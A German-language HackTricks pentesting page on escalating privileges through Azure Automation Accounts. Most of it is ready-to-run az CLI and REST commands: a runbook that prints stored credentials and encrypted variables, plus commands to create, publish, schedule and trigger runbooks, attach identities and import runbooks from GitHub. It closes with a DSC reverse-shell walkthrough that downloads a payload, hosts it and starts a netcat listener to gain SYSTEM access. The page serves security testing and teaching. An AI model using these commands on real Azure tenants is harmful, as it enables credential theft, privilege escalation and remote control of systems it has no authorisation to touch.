# Az - Azure Automation Accounts Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Automation Accounts

Für weitere Informationen siehe:

{{#ref}}
../az-services/az-automation-accounts.md
{{#endref}}

### Hybrid Workers Group

- **Vom Automation Account zur VM**

Denke daran, dass wenn ein Angreifer irgendwie einen beliebigen runbook (beliebigen Code) in einem hybrid worker ausführen kann, er **auf den Standort der VM pivotieren** wird. Das könnte eine on-premise Maschine, eine VPC einer anderen Cloud oder sogar eine Azure VM sein.

Außerdem, wenn der hybrid worker in Azure mit weiteren Managed Identities ausgeführt wird, kann das runbook auf die **managed identity des runbooks und alle managed identities der VM vom metadata service** zugreifen.

> [!TIP]
> Denke daran, dass der **metadata service** eine andere URL (**`http://169.254.169.254`**) hat als der Service, von dem man das Token für die Managed Identities des Automation Accounts erhält (**`IDENTITY_ENDPOINT`**).

- **Von der VM zum Automation Account**

Wenn außerdem jemand eine VM kompromittiert, auf der ein Automation Account-Skript läuft, kann er die **Automation Account**-Metadaten finden und von der VM aus darauf zugreifen, um Tokens für die an den Automation Account angehängten **Managed Identities** zu erhalten.

Wie im folgenden Bild zu sehen ist, ist es bei Administratorzugang auf die VM möglich, in den **Umgebungsvariablen des Prozesses** die URL und das Secret zu finden, um auf den Automation Account metadata service zuzugreifen:

![](</images/vm_to_aa.jpg>)


### `Microsoft.Automation/automationAccounts/jobs/write`, `Microsoft.Automation/automationAccounts/runbooks/draft/write`, `Microsoft.Automation/automationAccounts/jobs/output/read`, `Microsoft.Automation/automationAccounts/runbooks/publish/action` (`Microsoft.Resources/subscriptions/resourcegroups/read`, `Microsoft.Automation/automationAccounts/runbooks/write`)

Zusammengefasst erlauben diese Berechtigungen, **Runbooks zu erstellen, zu verändern und auszuführen** im Automation Account, was du nutzen könntest, um **Code auszuführen** im Kontext des Automation Accounts, Privilegien auf die zugewiesenen **Managed Identities** zu eskalieren und **credentials** sowie **encrypted variables** im Automation Account zu leaken.

Die Berechtigung **`Microsoft.Automation/automationAccounts/runbooks/draft/write`** erlaubt es, den Code eines Runbooks im Automation Account zu modifizieren, indem man:
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content '$creds = Get-AutomationPSCredential -Name "<credential-name>"
$runbook_variable = Get-AutomationVariable -Name "<encrypted-variable-name>"
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password'
```
Beachte, wie das vorherige Skript verwendet werden kann, um **leak den Benutzernamen und das Passwort** einer Anmeldeinformation sowie den Wert einer **verschlüsselten Variable** zu erhalten, die im Automation Account gespeichert sind.

Die Berechtigung **`Microsoft.Automation/automationAccounts/runbooks/publish/action`** erlaubt dem Benutzer, ein Runbook im Automation Account zu veröffentlichen, sodass die Änderungen angewendet werden:
```bash
az automation runbook publish \
--resource-group <res-group> \
--automation-account-name <account-name> \
--name <runbook-name>
```
Die Berechtigung **`Microsoft.Automation/automationAccounts/jobs/write`** erlaubt dem Benutzer, ein Runbook im Automation Account mithilfe von:
```bash
az automation runbook start \
--automation-account-name <account-name> \
--resource-group <res-group> \
--name <runbook-name> \
[--run-on <name-hybrid-group>]
```
Die Berechtigung **`Microsoft.Automation/automationAccounts/jobs/output/read`** erlaubt es dem Benutzer, die Ausgabe eines Jobs im Automation Account wie folgt zu lesen:
```bash
az rest --method GET \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/jobs/<job-name>/output?api-version=2023-11-01"
```
Wenn noch keine Runbooks erstellt wurden oder Sie ein neues erstellen möchten, benötigen Sie die **Berechtigungen `Microsoft.Resources/subscriptions/resourcegroups/read` und `Microsoft.Automation/automationAccounts/runbooks/write`**, um dies mit folgendem zu tun:
```bash
az automation runbook create --automation-account-name <account-name> --resource-group <res-group> --name <runbook-name> --type PowerShell
```
### `Microsoft.Automation/automationAccounts/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`

Diese Berechtigung erlaubt es dem Benutzer, **eine user managed identity dem Automation Account zuzuweisen**, mithilfe von:
```bash
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>?api-version=2020-01-13-preview" \
--headers "Content-Type=application/json" \
--body '{
"identity": {
"type": "UserAssigned",
"userAssignedIdentities": {
"/subscriptions/<subscripntion-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-managed-identity-name>": {}
}
}
}'
```
### `Microsoft.Automation/automationAccounts/schedules/write`, `Microsoft.Automation/automationAccounts/jobSchedules/write`

Mit der Berechtigung **`Microsoft.Automation/automationAccounts/schedules/write`** ist es möglich, einen neuen Schedule im Automation Account zu erstellen, der alle 15 Minuten ausgeführt wird (not very stealth) und mit dem folgenden Befehl angelegt wird.

Beachte, dass das **Mindestintervall für einen Schedule 15 Minuten beträgt**, und die **minimale Startzeit mindestens 5 Minuten** in der Zukunft liegen muss.
```bash
## For linux
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every minute" \
--start-time "$(date -u -d "7 minutes" +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15

## Form macOS
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every 15 minutes" \
--start-time "$(date -u -v+7M +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15
```
Dann ist es mit der Berechtigung **`Microsoft.Automation/automationAccounts/jobSchedules/write`** möglich, einem Runbook einen Scheduler zuzuweisen, indem man:
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-accounts>/jobSchedules/b510808a-8fdc-4509-a115-12cfc3a2ad0d?api-version=2015-10-31" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"runOn": "",
"runbook": {
"name": "<runbook-name>"
},
"schedule": {
"name": "<scheduler-name>>"
},
"parameters": {}
}
}'
```
> [!TIP]
> Im vorherigen Beispiel wurde die Job-Schedule-ID als **`b510808a-8fdc-4509-a115-12cfc3a2ad0d` als Beispiel** belassen, aber Sie müssen einen beliebigen Wert verwenden, um diese Zuordnung zu erstellen.

### `Microsoft.Automation/automationAccounts/webhooks/write`

Mit der Berechtigung **`Microsoft.Automation/automationAccounts/webhooks/write`** ist es möglich, einen neuen Webhook für ein Runbook in einem Automation Account zu erstellen, indem einer der folgenden Befehle verwendet wird.

With Azure Powershell:
```bash
New-AzAutomationWebHook -Name <webhook-name> -ResourceGroupName <res-group> -AutomationAccountName <automation-account-name> -RunbookName <runbook-name> -IsEnabled $true
```
Mit AzureCLI und REST:
```bash
az rest --method put \
--uri "https://management.azure.com/subscriptions/<subscriptionID>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/webhooks/<webhook-name>?api-version=2015-10-31" \
--body '{
"name": "<webhook-name>",
"properties": {
"isEnabled": true,
"expiryTime": "2027-12-31T23:59:59+00:00",
"runOn": "<worker name>",
"runbook": {
"name": "<runbook-name>"
}
}
}'
```
Diese Befehle sollten eine Webhook-URI zurückgeben, die nur bei der Erstellung angezeigt wird. Um das Runbook anschließend mit der Webhook-URI aufzurufen
```bash
curl -X POST "https://f931b47b-18c8-45a2-9d6d-0211545d8c02.webhook.eus.azure-automation.net/webhooks?token=Ts5WmbKk0zcuA8PEUD4pr%2f6SM0NWydiCDqCqS1IdzIU%3d" \
-H "Content-Length: 0"
```
### `Microsoft.Automation/automationAccounts/runbooks/draft/write`

Allein mit der Berechtigung `Microsoft.Automation/automationAccounts/runbooks/draft/write` ist es möglich, den Code eines Runbooks zu **aktualisieren**, ohne ihn zu veröffentlichen, und es mit den folgenden Befehlen auszuführen.
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content 'echo "Hello World"'

# Run the unpublished code
## Indicate the name of the hybrid worker group in runOn to execute the runbook there
az rest \
--method PUT \
--url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob?api-version=2023-05-15-preview" \
--headers "Content-Type=application/json" \
--body '{
"parameters": {},
"runOn": "",
"runtimeEnvironment": "PowerShell-5.1"
}'

# Get the output (a different permission is needed here, but you could get a revershell or exfiltrate the token to avoid needing this permission)
az rest --method get --url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob/streams?api-version=2019-06-01"
```
### `Microsoft.Automation/automationAccounts/sourceControls/write`, (`Microsoft.Automation/automationAccounts/sourceControls/read`)

Diese Berechtigung erlaubt dem Benutzer, **eine Source Control für das Automation Account zu konfigurieren**, mithilfe von Befehlen wie dem folgenden (dieses Beispiel verwendet Github):
```bash
az automation source-control create \
--resource-group <res-group> \
--automation-account-name <automation-account-name> \
--name RemoteGithub \
--repo-url https://github.com/carlospolop/gh-runbooks.git \
--branch main \
--folder-path /runbooks/ \
--publish-runbook true \
--auto-sync \
--source-type GitHub \
--token-type PersonalAccessToken \
--access-token github_pat_11AEDCVZ<rest-of-the-token>
```
Dies wird automatisch die runbooks aus dem Github-Repository in das Automation Account importieren und mit einigen zusätzlichen Berechtigungen zum Ausführen wäre es **possible to escalate privileges**.

Außerdem: Damit source control in Automation Accounts funktioniert, muss es eine managed identity mit der Rolle **`Contributor`** haben; wenn es sich um eine user managed identity handelt, muss die client id der MI in der Variable **`AUTOMATION_SC_USER_ASSIGNED_IDENTITY_ID`** angegeben werden.

> [!TIP]
> Beachte, dass es nicht möglich ist, die Repo-URL einer source control zu ändern, nachdem sie erstellt wurde.

### `Microsoft.Automation/automationAccounts/variables/write`

Mit der Berechtigung **`Microsoft.Automation/automationAccounts/variables/write`** ist es möglich, Variablen im Automation Account zu schreiben, indem man folgenden Befehl verwendet.
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/variables/<variable-name>?api-version=2019-06-01" \
--headers "Content-Type=application/json" \
--body '{
"name": "<variable-name>",
"properties": {
"description": "",
"value": "\"<variable-value>\"",
"isEncrypted": false
}
}'
```
### Benutzerdefinierte Laufzeitumgebungen

Wenn ein Automation Account eine benutzerdefinierte Laufzeitumgebung verwendet, könnte es möglich sein, ein benutzerdefiniertes Paket der Laufzeit mit schädlichem Code (wie **a backdoor**) zu überschreiben. Auf diese Weise wird jedes Mal, wenn ein runbook, das diese benutzerdefinierte Laufzeit nutzt, ausgeführt wird und das benutzerdefinierte Paket lädt, der schädliche Code ausgeführt.

### Kompromittierung der State Configuration

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

- Schritt 1 — Dateien erstellen

**Benötigte Dateien:** Es werden zwei PowerShell-Skripte benötigt:
1. `reverse_shell_config.ps1`: Eine Desired State Configuration (DSC)-Datei, die das payload abruft und ausführt. Erhältlich auf [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: Ein Skript, um die Konfiguration auf der VM zu veröffentlichen. Verfügbar auf [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).

**Anpassung:** Variablen und Parameter in diesen Dateien müssen an die spezifische Umgebung des Nutzers angepasst werden, einschließlich Ressourcennamen, Dateipfaden und Server-/Payload-Identifikatoren.

- Schritt 2 — Konfigurationsdatei zippen

Die Datei `reverse_shell_config.ps1` wird in eine `.zip`-Datei komprimiert, sodass sie für die Übertragung in den Azure Storage Account bereit ist.
```bash
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
- Schritt 3 — Storage-Kontext festlegen & Hochladen

Die gezippte Konfigurationsdatei wird mit dem Azure-Cmdlet Set-AzStorageBlobContent in einen vordefinierten Azure Storage-Container (azure-pentest) hochgeladen.
```bash
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
- Schritt 4 — Kali-Box vorbereiten

Der Kali-Server lädt die RevPS.ps1 payload von einem GitHub-Repository herunter.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
Das Skript wird bearbeitet, um die Ziel-Windows VM und den Port für die reverse shell anzugeben.

- Schritt 5 — Konfigurationsdatei veröffentlichen

Die Konfigurationsdatei wird ausgeführt, wodurch das reverse-shell-Skript an dem angegebenen Ort auf der Windows VM bereitgestellt wird.

- Schritt 6 — Payload hosten und Listener einrichten

Ein Python SimpleHTTPServer wird gestartet, um das payload zu hosten, zusammen mit einem Netcat listener, um eingehende Verbindungen abzufangen.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
Der scheduled task führt die payload aus und erlangt SYSTEM-level privileges.

{{#include ../../../banners/hacktricks-training.md}}
